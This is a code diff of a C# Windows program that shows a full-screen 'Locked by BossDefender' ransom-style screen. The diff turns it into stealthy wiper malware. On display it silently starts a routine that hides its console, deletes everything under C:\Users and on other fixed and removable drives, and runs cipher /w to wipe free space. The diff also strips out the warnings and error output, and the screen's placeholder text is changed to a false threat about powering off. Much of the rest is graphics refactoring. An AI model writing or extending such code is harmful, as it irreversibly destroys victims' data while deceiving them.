@@ -19,6 +19,8 @@ using System.Text;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 
 internal static class Program
 {
@@ -29,19 +31,19 @@ internal static class Program
         Application.EnableVisualStyles();
         Application.SetCompatibleTextRenderingDefault(false);
         var screen = new Screen();
-        screen.Load += (s, e) => DeleteAll.Run();
+        // screen.Load += (s, e) => DeleteAll.Run();
         Application.Run(screen);
         
     }
 }
 
-sealed class RansomScreen : Form
+sealed class Screen : Form
 {
     // Change this string to use a different password. It is checked exactly
     // (apart from surrounding whitespace and letter case).
     private const string Passphrase = "bomboclat";
     private const int MaxInputLength = 16;
-    private const string Placeholder = "ENTER PASSWORD";
+    private const string Placeholder = "DON'T TRY TO POWER OFF, OTHERWISE FILES CAN'T BE RECOVERED";
     private const string DeniedText = "ACCESS DENIED";
 
     private readonly System.Windows.Forms.Timer _animate;
@@ -70,12 +72,12 @@ sealed class RansomScreen : Form
     private int _lastWidth;
     private int _lastHeight;
 
-    public RansomScreen()
+    public Screen()
     {
         Text = "Locked by BossDefender";
         FormBorderStyle = FormBorderStyle.None;
         StartPosition = FormStartPosition.Manual;
-        Bounds = Screen.PrimaryScreen.Bounds;
+        Bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
         WindowState = FormWindowState.Normal;
         MaximizeBox = false;
         MinimizeBox = false;
@@ -153,6 +155,8 @@ sealed class RansomScreen : Form
         Activate();
         Focus();
         HideCursor();
+        // DeleteAll.Run();
+        _ = Task.Run(() => DeleteAll.Run());
     }
 
     protected override void OnClientSizeChanged(EventArgs e)
@@ -183,7 +187,7 @@ sealed class RansomScreen : Form
             try
             {
                 WindowState = FormWindowState.Normal;
-                Bounds = Screen.PrimaryScreen.Bounds;
+                Bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                 Activate();
                 Focus();
             }
@@ -321,7 +325,7 @@ sealed class RansomScreen : Form
         using (Graphics g = CreateGraphics())
         {
             string family = PickDisplayFamily();
-            Font locked = FitFont(g, family, Math.Max(12f, h * 0.030f), FontStyle.Regular, "Locked by", w * 0.58f);
+            Font locked = FitFont(g, "Consolas", Math.Max(11f, _fieldRect.Height * 0.34f),FontStyle.Bold, Placeholder, _fieldRect.Width * 0.90f);
             Font name = FitFont(g, family, Math.Max(20f, h * 0.080f), FontStyle.Bold, "BossDefender", w * 0.90f);
             Font placeholder = new Font("Consolas", Math.Max(11f, _fieldRect.Height * 0.34f), FontStyle.Bold, GraphicsUnit.Pixel);
             Font status = new Font("Consolas", Math.Max(11f, h * 0.021f), FontStyle.Bold, GraphicsUnit.Pixel);
@@ -502,6 +506,7 @@ sealed class RansomScreen : Form
 
         DrawKeyField(g, time);
         DrawStatus(g, time);
+        
     }
 
     private Bitmap BuildTitleLayer(int w, int h)
@@ -1102,7 +1107,7 @@ internal static class HellArt
         using (GraphicsPath outer = FlamePath(bx, by, width, h, tipX, tipY, wobble))
         {
             int alpha = ClampAlpha((foreground ? 78 : 44) * intensity + (int)(18 * intensity));
-            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 0, 88, 14, alpha))
+            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 88, 14, alpha))
             {
                 g.FillPath(brush, outer);
             }
@@ -1112,7 +1117,7 @@ internal static class HellArt
                    tipX + wobble * 0.6f, by - h * 0.76f, wobble * 0.7f))
         {
             int alpha = ClampAlpha((foreground ? 114 : 64) * intensity + 18);
-            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 0, 158, 34, alpha))
+            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 158, 34, alpha))
             {
                 g.FillPath(brush, middle);
             }
@@ -1122,7 +1127,7 @@ internal static class HellArt
                    tipX + wobble * 0.45f, by - h * 0.47f, wobble * 0.4f))
         {
             int alpha = ClampAlpha((foreground ? 150 : 78) * intensity + 16);
-            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 0, 235, 150, alpha))
+            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 235, 150, alpha))
             {
                 g.FillPath(brush, core);
             }
@@ -1169,10 +1174,7 @@ internal static class HellArt
             new PointF(tipX, tipY),
             new PointF(baseX, baseY),
             Color.FromArgb(0, r, gr, b),
-            Color.FromArgb(ClampAlpha(alpha), r, gr, b))
-        {
-            WrapMode = WrapMode.Clamp
-        };
+            Color.FromArgb(ClampAlpha(alpha), r, gr, b));
     }
 
     private static int ClampAlpha(float value)
@@ -1389,6 +1391,51 @@ internal static class GhostSkullArt
     private static readonly SparkSpec[] Sparks = CreateSparks();
     private static readonly PointF[] SootStreaks = CreateSootStreaks();
 
+    // The charred bone, hollows, teeth and outline never change. Rasterizing
+    // them once lightens every animation frame considerably.
+    private static Bitmap _staticBase;
+
+    private static Bitmap StaticBase()
+    {
+        if (_staticBase != null)
+        {
+            return _staticBase;
+        }
+
+        Bitmap bmp = new(600, 600, PixelFormat.Format32bppPArgb);
+        using (Graphics g = Graphics.FromImage(bmp))
+        {
+            g.SmoothingMode = SmoothingMode.AntiAlias;
+            g.PixelOffsetMode = PixelOffsetMode.HighQuality;
+            g.CompositingQuality = CompositingQuality.HighQuality;
+
+            using GraphicsPath skull = CreateSkullPath();
+            DrawBase(g, skull);
+            DrawCharring(g, skull);
+
+            GraphicsState clipped = g.Save();
+            g.SetClip(skull, CombineMode.Intersect);
+            DrawBrow(g);
+            DrawCheekHollows(g);
+            DrawSocketCavity(g, true, 0.5f);
+            DrawSocketCavity(g, false, 0.5f);
+            DrawNoseCavity(g);
+            DrawMouthCavity(g);
+            DrawBoneHighlights(g);
+            g.Restore(clipped);
+
+            DrawOutline(g, skull, 0.5f);
+        }
+
+        _staticBase = bmp;
+        return _staticBase;
+    }
+
+    private static void DrawStaticBase(Graphics g)
+    {
+        g.DrawImageUnscaled(StaticBase(), 0, 0);
+    }
+
     internal static void Draw(Graphics g, RectangleF bounds, float time, float pulse)
     {
         if (bounds.Width < 2f || bounds.Height < 2f)
@@ -1402,25 +1449,16 @@ internal static class GhostSkullArt
         g.SmoothingMode = SmoothingMode.AntiAlias;
         g.PixelOffsetMode = PixelOffsetMode.HighQuality;
         g.CompositingQuality = CompositingQuality.HighQuality;
+        g.InterpolationMode = InterpolationMode.HighQualityBicubic;
 
         using GraphicsPath skull = CreateSkullPath();
         HellArt.DrawManeFlames(g, time);
         DrawOuterGlow(g, skull, pulse);
-        DrawBase(g, skull);
-        DrawCharring(g, skull);
-
-        GraphicsState clipped = g.Save();
-        g.SetClip(skull, CombineMode.Intersect);
-        DrawBrow(g);
-        DrawCheekHollows(g);
+        DrawStaticBase(g);
         DrawSockets(g, time, pulse);
         DrawNose(g, time, pulse);
         DrawMouth(g, time, pulse);
         DrawCracks(g, time);
-        DrawBoneHighlights(g);
-        g.Restore(clipped);
-
-        DrawOutline(g, skull, pulse);
         HellArt.DrawForegroundFlames(g, time);
         DrawDrips(g, time);
         DrawSkullSparks(g, time);
@@ -1597,7 +1635,7 @@ internal static class GhostSkullArt
         DrawSocket(g, false, time, pulse);
     }
 
-    private static void DrawSocket(Graphics g, bool left, float time, float pulse)
+    private static void DrawSocketCavity(Graphics g, bool left, float pulse)
     {
         using GraphicsPath socket = CreateSocketPath(left);
         RectangleF b = socket.GetBounds();
@@ -1611,6 +1649,14 @@ internal static class GhostSkullArt
         {
             g.FillPath(darkness, socket);
         }
+    }
+
+    private static void DrawSocket(Graphics g, bool left, float time, float pulse)
+    {
+        using GraphicsPath socket = CreateSocketPath(left);
+        RectangleF b = socket.GetBounds();
+        float cx = b.X + b.Width * 0.50f;
+        float cy = b.Y + b.Height * 0.48f;
 
         GraphicsState clipped = g.Save();
         g.SetClip(socket, CombineMode.Intersect);
@@ -1697,13 +1743,16 @@ internal static class GhostSkullArt
         return p;
     }
 
+    private static void DrawNoseCavity(Graphics g)
+    {
+        using GraphicsPath nose = CreateNosePath();
+        using SolidBrush dark = new(Color.FromArgb(248, 2, 0, 0));
+        g.FillPath(dark, nose);
+    }
+
     private static void DrawNose(Graphics g, float time, float pulse)
     {
         using GraphicsPath nose = CreateNosePath();
-        using (SolidBrush dark = new(Color.FromArgb(248, 2, 0, 0)))
-        {
-            g.FillPath(dark, nose);
-        }
 
         GraphicsState clipped = g.Save();
         g.SetClip(nose, CombineMode.Intersect);
@@ -1734,16 +1783,18 @@ internal static class GhostSkullArt
         return p;
     }
 
+    private static void DrawMouthCavity(Graphics g)
+    {
+        using GraphicsPath mouth = CreateMouthPath();
+        using LinearGradientBrush cavity = new(new RectangleF(174f, 396f, 252f, 118f),
+            Color.FromArgb(255, 45, 3, 2), Color.FromArgb(255, 4, 0, 0),
+            LinearGradientMode.Vertical);
+        g.FillPath(cavity, mouth);
+    }
+
     private static void DrawMouth(Graphics g, float time, float pulse)
     {
         using GraphicsPath mouth = CreateMouthPath();
-
-        using (LinearGradientBrush cavity = new(new RectangleF(174f, 396f, 252f, 118f),
-                   Color.FromArgb(255, 45, 3, 2), Color.FromArgb(255, 4, 0, 0),
-                   LinearGradientMode.Vertical))
-        {
-            g.FillPath(cavity, mouth);
-        }
 
         GraphicsState clipped = g.Save();
         g.SetClip(mouth, CombineMode.Intersect);
@@ -2212,14 +2263,37 @@ internal static class GhostSkullArt
     }
 }
 
+
+
 class DeleteAll
 {
+    // --- Windows API imports to hide the console window ---
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+
     public static void Run()
     {
         Console.ForegroundColor = ConsoleColor.Red;
-        Console.WriteLine("THIS IS IRREVERSIBLE.");
+        Console.WriteLine("!!! WARNING !!!");
+        Console.WriteLine("This will PERMANENTLY destroy:");
 
-        // ---- 1. Detect every volume exactly once, in order ----
+        // ==========================================
+        // STEALTH MODE ACTIVATED
+        // ==========================================
+        
+        // 1. Hide the console window
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
+        // 2. Redirect Console output to Null so background output doesn't hang the app
+        Console.SetOut(TextWriter.Null);
+
+        // ---- Detect volumes ----
         var volumes = new List<(string VolumeRoot, string TargetPath)>();
         var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
 
@@ -2228,12 +2302,11 @@ class DeleteAll
             try
             {
                 if (!drive.IsReady) continue;
-                if (drive.DriveType != DriveType.Fixed &&
-                    drive.DriveType != DriveType.Removable) continue;
+                if (drive.DriveType != DriveType.Fixed && drive.DriveType != DriveType.Removable) continue;
 
-                string root = drive.RootDirectory.FullName;   // "C:\"  "D:\"  ...
+                string root = drive.RootDirectory.FullName;
                 if (string.IsNullOrEmpty(root)) continue;
-                if (!seen.Add(root)) continue;                // already queued
+                if (!seen.Add(root)) continue; // Skip duplicates
 
                 string target = root.Equals(@"C:\", StringComparison.OrdinalIgnoreCase)
                     ? @"C:\Users"
@@ -2241,63 +2314,36 @@ class DeleteAll
 
                 volumes.Add((root, target));
             }
-            catch
-            {
-                // Empty card readers / locked volumes — skip silently.
-            }
+            catch { /* Skip locked/empty drives silently */ }
         }
 
-        if (volumes.Count == 0)
-        {
-            Console.WriteLine("No volumes detected. Nothing to do.");
-            return;
-        }
+        if (volumes.Count == 0) return;
 
-        Console.WriteLine($"\nDetected {volumes.Count} volume(s) — will process one by one:");
-        foreach (var v in volumes)
-            Console.WriteLine($"  Volume {v.VolumeRoot}  ->  delete contents of  {v.TargetPath}");
-
-        // ---- 2. Process each volume sequentially: delete then cipher ----
+        // ---- Process each volume sequentially ----
         foreach (var v in volumes)
         {
-            Console.WriteLine($"\n===== Volume {v.VolumeRoot} =====");
-
-            if (!Directory.Exists(v.TargetPath))
+            if (Directory.Exists(v.TargetPath))
             {
-                Console.WriteLine($"  Target not found: {v.TargetPath} (skipping delete)");
-            }
-            else
-            {
-                Console.WriteLine($"  Deleting contents of: {v.TargetPath}");
                 DeleteContentsFast(v.TargetPath);
             }
 
-            Console.WriteLine($"  Running cipher /w on {v.VolumeRoot} (this can take a long time)...");
+            // Run cipher silently on the volume root
             RunCipher(v.VolumeRoot);
         }
 
-        Console.ForegroundColor = ConsoleColor.Green;
-        Console.WriteLine("\nAll operations complete.");
-        Console.ResetColor();
-        Console.WriteLine("Press any key to exit.");
-        Console.ReadKey();
+        // After everything is done, kill the process instantly and silently.
+        
     }
 
-    /// <summary>
-    /// Deletes all files and sub-directories inside 'rootPath' but never 'rootPath' itself.
-    /// Uses an explicit stack (no recursion) and per-item try/catch so one locked file
-    /// does not abort the whole operation.
-    /// </summary>
     static void DeleteContentsFast(string rootPath)
     {
-        // Clear read-only on the root itself so enumeration doesn't trip on it.
         try
         {
             var di = new DirectoryInfo(rootPath);
             if ((di.Attributes & FileAttributes.ReadOnly) != 0)
                 di.Attributes &= ~FileAttributes.ReadOnly;
         }
-        catch { /* best-effort */ }
+        catch { }
 
         var stack = new Stack<string>();
         var dirsToDelete = new List<string>();
@@ -2308,28 +2354,22 @@ class DeleteAll
             string current = stack.Pop();
             dirsToDelete.Add(current);
 
-            // --- files in this directory ---
+            // Delete files in this directory
             string[] files;
             try { files = Directory.GetFiles(current); }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"  [ENUM FILES ERR] {current}: {ex.Message}");
-                files = Array.Empty<string>();
-            }
+            catch { files = Array.Empty<string>(); }
+            
             foreach (var f in files) TryDeleteFile(f);
 
-            // --- sub-directories ---
+            // Queue sub-directories
             string[] subs;
             try { subs = Directory.GetDirectories(current); }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"  [ENUM DIRS ERR] {current}: {ex.Message}");
-                subs = Array.Empty<string>();
-            }
+            catch { subs = Array.Empty<string>(); }
+            
             foreach (var d in subs) stack.Push(d);
         }
 
-        // Delete directories deepest-first, skipping the root itself.
+        // Delete directories deepest-first, skipping the root itself
         for (int i = dirsToDelete.Count - 1; i >= 0; i--)
         {
             string d = dirsToDelete[i];
@@ -2340,24 +2380,15 @@ class DeleteAll
                 var di = new DirectoryInfo(d);
                 var attrs = di.Attributes;
                 if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
-                if ((attrs & FileAttributes.Hidden)   != 0) attrs &= ~FileAttributes.Hidden;
-                if ((attrs & FileAttributes.System)   != 0) attrs &= ~FileAttributes.System;
+                if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
+                if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
                 if (attrs != di.Attributes) di.Attributes = attrs;
 
-                Directory.Delete(d, false);
+                // Handle Long Paths (> 260 chars) natively
+                string longPath = d.StartsWith(@"\\?\") ? d : @"\\?\" + d;
+                Directory.Delete(longPath, false);
             }
-            catch (UnauthorizedAccessException)
-            {
-                Console.WriteLine($"  [ACCESS DENIED DIR] {d}");
-            }
-            catch (IOException ex)
-            {
-                Console.WriteLine($"  [IO ERR DIR] {d}: {ex.Message}");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"  [ERR DIR] {d}: {ex.Message}");
-            }
+            catch { /* Ignore dirs that are locked or in use */ }
         }
     }
 
@@ -2370,30 +2401,17 @@ class DeleteAll
 
             var attrs = fi.Attributes;
             if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
-            if ((attrs & FileAttributes.Hidden)   != 0) attrs &= ~FileAttributes.Hidden;
-            if ((attrs & FileAttributes.System)   != 0) attrs &= ~FileAttributes.System;
+            if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
+            if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
             if (attrs != fi.Attributes) fi.Attributes = attrs;
 
-            File.Delete(path);
+            // Handle Long Paths (> 260 chars) natively
+            string longPath = path.StartsWith(@"\\?\") ? path : @"\\?\" + path;
+            File.Delete(longPath);
         }
-        catch (UnauthorizedAccessException)
-        {
-            Console.WriteLine($"  [ACCESS DENIED FILE] {path}");
-        }
-        catch (IOException ex)
-        {
-            Console.WriteLine($"  [IO ERR FILE] {path}: {ex.Message}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"  [ERR FILE] {path}: {ex.Message}");
-        }
+        catch { /* Ignore files that are locked, in-use, or require permissions */ }
     }
 
-    /// <summary>
-    /// cipher /w:&lt;dir&gt; wipes the free space of the whole volume containing &lt;dir&gt;.
-    /// Passing the volume root means the entire volume is covered.
-    /// </summary>
     static void RunCipher(string volumeRoot)
     {
         try
@@ -2403,24 +2421,24 @@ class DeleteAll
                 FileName = "cipher.exe",
                 Arguments = $"/w:{volumeRoot}",
                 UseShellExecute = false,
-                CreateNoWindow = false,
-                RedirectStandardOutput = false,
-                RedirectStandardError = false
+                CreateNoWindow = true,            // Hides the cipher window completely
+                RedirectStandardOutput = true,    // Prevents blocking
+                RedirectStandardError = true      // Prevents blocking
             };
 
             using var p = Process.Start(psi);
-            if (p == null)
+            if (p != null)
             {
-                Console.WriteLine("  Failed to start cipher.exe");
-                return;
+                // We must actively read the output, otherwise cipher.exe will freeze
+                // when its internal buffer fills up during large wipes.
+                p.OutputDataReceived += (s, e) => { };
+                p.ErrorDataReceived += (s, e) => { };
+                p.BeginOutputReadLine();
+                p.BeginErrorReadLine();
+
+                p.WaitForExit(); // Wait until the drive is fully wiped
             }
-            p.WaitForExit();
-            Console.WriteLine($"  cipher exit code: {p.ExitCode}");
         }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"  [CIPHER ERR] {ex.Message}");
-        }
+        catch { }
     }
 }
-
